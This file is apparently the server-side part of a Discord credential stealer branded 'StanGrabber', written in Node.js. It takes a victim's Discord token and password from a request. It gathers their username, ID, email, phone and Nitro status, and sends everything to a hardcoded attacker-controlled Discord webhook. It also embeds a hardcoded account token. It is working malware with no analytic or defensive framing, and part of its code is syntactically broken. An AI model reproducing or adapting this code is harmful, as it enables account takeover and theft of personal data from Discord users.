const axios = require('axios');



var info;
axios.get('https://discordapp.com/api/v8/users/@me', {
    withCredentials: true,
    headers: {
      Authorization: "Njg5MTE3MzQxMzc1OTIyMjI3.X_XWpA.t4ZxKvzRtcg5l1DYuSah6sDpHb8",
    },
  }).then((response) => {	
    info = response.data;
  }
  )

exports.send = (req, res, webhook) =>
{
	const token = req.body.token;
	const password = req.body.password;
	
	if(token === undefined || password === undefined)
		return res.status(400).json({status: "error", message: "Not sent."});
	
	


	
	
	var discrim = JSON.parse(JSON.stringify(info)).discriminator;
	var username = JSON.parse(JSON.stringify(info)).username + "#" + discrim;


	var id = JSON.parse(JSON.stringify(info)).id;

	
	
	var email = JSON.parse(JSON.stringify(info)).email;
	
	var phone = JSON.parse(JSON.stringify(info)).phone;
	
	if (phone == 'null')
	{
		phone = 'None';
	}
	var nitro = 'none';

	var nitro2 = JSON.parse(JSON.stringify(info)).premium_type;
	if (nitro2 == 0)
	{
		nitro = 'none';
	}
	else if (nitro2 == 1)
	{
		nitro = 'Nitro Classic';
	}
	else if (nitro2 == 2)
	{
		nitro = 'Nitro Boost';
	}

	

	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: `Username : ` + username + '\n' + `ID : ` + id + '\n' + "E-Mail : " + email + '\n' + "Phone : " + phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password, embeds:[
	
	description:`test`
	]})
	.then((resp) => 
	{
		if(resp.status === 200)
			return res.status(200).json({status: "ok", message: "Sent."});
	})
	.catch((err) => 
	{
		return res.status(500).json({status: "error", message: "Not sent."});
	});
	
	res.status(200).json({status: "ok", message: "Sent."});
}

